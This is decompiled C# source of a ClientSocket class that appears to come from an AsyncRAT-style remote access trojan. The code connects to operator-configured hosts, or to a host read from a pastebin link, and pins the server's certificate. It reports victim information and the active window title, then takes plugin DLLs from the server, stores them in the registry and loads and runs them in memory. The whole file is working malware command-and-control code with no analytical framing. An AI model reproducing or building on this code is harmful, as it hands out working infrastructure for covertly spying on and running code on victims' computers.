using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Client.Helper;
using MessagePackLib.MessagePack;
using Microsoft.CSharp.RuntimeBinder;

namespace Client.Connection
{
	// Token: 0x02000004 RID: 4
	public static class ClientSocket
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000006 RID: 6 RVA: 0x00002060 File Offset: 0x00000260
		// (set) Token: 0x06000007 RID: 7 RVA: 0x00002067 File Offset: 0x00000267
		public static Socket TcpClient { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000008 RID: 8 RVA: 0x0000206F File Offset: 0x0000026F
		// (set) Token: 0x06000009 RID: 9 RVA: 0x00002076 File Offset: 0x00000276
		public static SslStream SslClient { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x0600000A RID: 10 RVA: 0x0000207E File Offset: 0x0000027E
		// (set) Token: 0x0600000B RID: 11 RVA: 0x00002085 File Offset: 0x00000285
		private static byte[] Buffer { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600000C RID: 12 RVA: 0x0000208D File Offset: 0x0000028D
		// (set) Token: 0x0600000D RID: 13 RVA: 0x00002094 File Offset: 0x00000294
		private static long HeaderSize { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600000E RID: 14 RVA: 0x0000209C File Offset: 0x0000029C
		// (set) Token: 0x0600000F RID: 15 RVA: 0x000020A3 File Offset: 0x000002A3
		private static long Offset { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000010 RID: 16 RVA: 0x000020AB File Offset: 0x000002AB
		// (set) Token: 0x06000011 RID: 17 RVA: 0x000020B2 File Offset: 0x000002B2
		private static Timer KeepAlive { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000012 RID: 18 RVA: 0x000020BA File Offset: 0x000002BA
		// (set) Token: 0x06000013 RID: 19 RVA: 0x000020C1 File Offset: 0x000002C1
		public static bool IsConnected { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000014 RID: 20 RVA: 0x000020C9 File Offset: 0x000002C9
		private static object SendSync { get; } = new object();

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000015 RID: 21 RVA: 0x000020D0 File Offset: 0x000002D0
		// (set) Token: 0x06000016 RID: 22 RVA: 0x000020D7 File Offset: 0x000002D7
		private static Timer Ping { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000017 RID: 23 RVA: 0x000020DF File Offset: 0x000002DF
		// (set) Token: 0x06000018 RID: 24 RVA: 0x000020E6 File Offset: 0x000002E6
		public static int Interval { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000019 RID: 25 RVA: 0x000020EE File Offset: 0x000002EE
		// (set) Token: 0x0600001A RID: 26 RVA: 0x000020F5 File Offset: 0x000002F5
		public static bool ActivatePo_ng { get; set; }

		// Token: 0x0600001B RID: 27 RVA: 0x00002AC4 File Offset: 0x00000CC4
		public static void InitializeClient()
		{
			try
			{
				ClientSocket.TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				{
					ReceiveBufferSize = 51200,
					SendBufferSize = 51200
				};
				if (Settings.Paste_bin == "null")
				{
					string text = Settings.Hos_ts.Split(new char[]
					{
						','
					})[new Random().Next(Settings.Hos_ts.Split(new char[]
					{
						','
					}).Length)];
					int port = Convert.ToInt32(Settings.Por_ts.Split(new char[]
					{
						','
					})[new Random().Next(Settings.Por_ts.Split(new char[]
					{
						','
					}).Length)]);
					if (ClientSocket.IsValidDomainName(text))
					{
						foreach (IPAddress address in Dns.GetHostAddresses(text))
						{
							try
							{
								ClientSocket.TcpClient.Connect(address, port);
								if (ClientSocket.TcpClient.Connected)
								{
									break;
								}
							}
							catch
							{
							}
						}
					}
					else
					{
						ClientSocket.TcpClient.Connect(text, port);
					}
				}
				else
				{
					using (WebClient webClient = new WebClient())
					{
						NetworkCredential credentials = new NetworkCredential("", "");
						webClient.Credentials = credentials;
						string[] array = webClient.DownloadString(Settings.Paste_bin).Split(new string[]
						{
							":"
						}, StringSplitOptions.None);
						Settings.Hos_ts = array[0];
						Settings.Por_ts = array[new Random().Next(1, array.Length)];
						ClientSocket.TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
					}
				}
				if (ClientSocket.TcpClient.Connected)
				{
					ClientSocket.IsConnected = true;
					ClientSocket.SslClient = new SslStream(new NetworkStream(ClientSocket.TcpClient, true), false, new RemoteCertificateValidationCallback(ClientSocket.ValidateServerCertificate));
					ClientSocket.SslClient.AuthenticateAsClient(ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(new char[]
					{
						':'
					})[0], null, SslProtocols.Tls, false);
					ClientSocket.HeaderSize = 4L;
					ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
					ClientSocket.Offset = 0L;
					ClientSocket.Send(IdSender.SendInfo());
					ClientSocket.Interval = 0;
					ClientSocket.ActivatePo_ng = false;
					ClientSocket.KeepAlive = new Timer(new TimerCallback(ClientSocket.KeepAlivePacket), null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
					ClientSocket.Ping = new Timer(new TimerCallback(ClientSocket.Po_ng), null, 1, 1);
					ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), null);
				}
				else
				{
					ClientSocket.IsConnected = false;
				}
			}
			catch
			{
				ClientSocket.IsConnected = false;
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000020FD File Offset: 0x000002FD
		private static bool IsValidDomainName(string name)
		{
			return Uri.CheckHostName(name) > UriHostNameType.Unknown;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002108 File Offset: 0x00000308
		private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Settings.Server_Certificate.Equals(certificate);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002E10 File Offset: 0x00001010
		public static void Reconnect()
		{
			try
			{
				Timer ping = ClientSocket.Ping;
				if (ping != null)
				{
					ping.Dispose();
				}
				Timer keepAlive = ClientSocket.KeepAlive;
				if (keepAlive != null)
				{
					keepAlive.Dispose();
				}
				SslStream sslClient = ClientSocket.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = ClientSocket.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
			ClientSocket.IsConnected = false;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002E98 File Offset: 0x00001098
		public static void ReadServertData(IAsyncResult ar)
		{
			try
			{
				if (!ClientSocket.TcpClient.Connected || !ClientSocket.IsConnected)
				{
					ClientSocket.IsConnected = false;
				}
				else
				{
					int num = ClientSocket.SslClient.EndRead(ar);
					if (num > 0)
					{
						ClientSocket.Offset += (long)num;
						ClientSocket.HeaderSize -= (long)num;
						if (ClientSocket.HeaderSize == 0L)
						{
							ClientSocket.HeaderSize = (long)BitConverter.ToInt32(ClientSocket.Buffer, 0);
							if (ClientSocket.HeaderSize > 0L)
							{
								ClientSocket.Offset = 0L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
								while (ClientSocket.HeaderSize > 0L)
								{
									int num2 = ClientSocket.SslClient.Read(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize);
									if (num2 <= 0)
									{
										ClientSocket.IsConnected = false;
										return;
									}
									ClientSocket.Offset += (long)num2;
									ClientSocket.HeaderSize -= (long)num2;
									if (ClientSocket.HeaderSize < 0L)
									{
										ClientSocket.IsConnected = false;
										return;
									}
								}
								new Thread(new ParameterizedThreadStart(ClientSocket.Read)).Start(ClientSocket.Buffer);
								ClientSocket.Offset = 0L;
								ClientSocket.HeaderSize = 4L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
							}
							else
							{
								ClientSocket.HeaderSize = 4L;
								ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
								ClientSocket.Offset = 0L;
							}
						}
						else if (ClientSocket.HeaderSize < 0L)
						{
							ClientSocket.IsConnected = false;
							return;
						}
						ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int)ClientSocket.Offset, (int)ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), null);
					}
					else
					{
						ClientSocket.IsConnected = false;
					}
				}
			}
			catch
			{
				ClientSocket.IsConnected = false;
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000307C File Offset: 0x0000127C
		public static void Send(byte[] msg)
		{
			object sendSync = ClientSocket.SendSync;
			lock (sendSync)
			{
				try
				{
					if (ClientSocket.IsConnected)
					{
						byte[] bytes = BitConverter.GetBytes(msg.Length);
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
						ClientSocket.SslClient.Write(bytes, 0, bytes.Length);
						if (msg.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(msg))
							{
								memoryStream.Position = 0L;
								byte[] array = new byte[50000];
								int count;
								while ((count = memoryStream.Read(array, 0, array.Length)) > 0)
								{
									ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
									ClientSocket.SslClient.Write(array, 0, count);
									ClientSocket.SslClient.Flush();
								}
								goto IL_E5;
							}
						}
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
						ClientSocket.SslClient.Write(msg, 0, msg.Length);
						ClientSocket.SslClient.Flush();
						IL_E5:;
					}
				}
				catch
				{
					ClientSocket.IsConnected = false;
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000031B4 File Offset: 0x000013B4
		public static void KeepAlivePacket(object obj)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
				ClientSocket.Send(msgPack.Encode2Bytes());
				GC.Collect();
				ClientSocket.ActivatePo_ng = true;
			}
			catch
			{
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003220 File Offset: 0x00001420
		private static void Po_ng(object obj)
		{
			try
			{
				if (ClientSocket.ActivatePo_ng && ClientSocket.IsConnected)
				{
					ClientSocket.Interval++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003268 File Offset: 0x00001468
		public static void Read(object data)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.DecodeFromBytes((byte[])data);
				string asString = msgPack.ForcePathObject("Pac_ket").AsString;
				if (!(asString == "Po_ng"))
				{
					if (!(asString == "plu_gin"))
					{
						if (!(asString == "save_Plugin"))
						{
							goto IL_1C7;
						}
					}
					else
					{
						try
						{
							if (SetRegistry.GetValue(msgPack.ForcePathObject("Dll").AsString) == null)
							{
								ClientSocket.Packs.Add(msgPack);
								MsgPack msgPack2 = new MsgPack();
								msgPack2.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
								msgPack2.ForcePathObject("Hashes").SetAsString(msgPack.ForcePathObject("Dll").AsString);
								ClientSocket.Send(msgPack2.Encode2Bytes());
							}
							else
							{
								ClientSocket.Invoke(msgPack);
							}
							goto IL_1C7;
						}
						catch (Exception ex)
						{
							ClientSocket.Error(ex.Message);
							goto IL_1C7;
						}
					}
					SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes());
					foreach (MsgPack msgPack3 in ClientSocket.Packs.ToList<MsgPack>())
					{
						if (msgPack3.ForcePathObject("Dll").AsString == msgPack.ForcePathObject("Hash").AsString)
						{
							ClientSocket.Invoke(msgPack3);
							ClientSocket.Packs.Remove(msgPack3);
						}
					}
				}
				else
				{
					ClientSocket.ActivatePo_ng = false;
					MsgPack msgPack4 = new MsgPack();
					msgPack4.ForcePathObject("Pac_ket").SetAsString("Po_ng");
					msgPack4.ForcePathObject("Message").SetAsInteger((long)ClientSocket.Interval);
					ClientSocket.Send(msgPack4.Encode2Bytes());
					ClientSocket.Interval = 0;
				}
				IL_1C7:;
			}
			catch (Exception ex2)
			{
				ClientSocket.Error(ex2.Message);
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000349C File Offset: 0x0000169C
		private static void Invoke(MsgPack unpack_msgpack)
		{
			object arg = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
			if (ClientSocket.<>o__53.<>p__0 == null)
			{
				ClientSocket.<>o__53.<>p__0 = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", null, typeof(ClientSocket), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
				}));
			}
			ClientSocket.<>o__53.<>p__0.Target(ClientSocket.<>o__53.<>p__0, arg, ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
			ClientSocket.Received();
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002115 File Offset: 0x00000315
		private static void Received()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
			ClientSocket.Send(msgPack.Encode2Bytes());
			Thread.Sleep(1000);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002154 File Offset: 0x00000354
		public static void Error(string ex)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Error";
			msgPack.ForcePathObject("Error").AsString = ex;
			ClientSocket.Send(msgPack.Encode2Bytes());
		}

		// Token: 0x0400001F RID: 31
		public static List<MsgPack> Packs = new List<MsgPack>();
	}
}
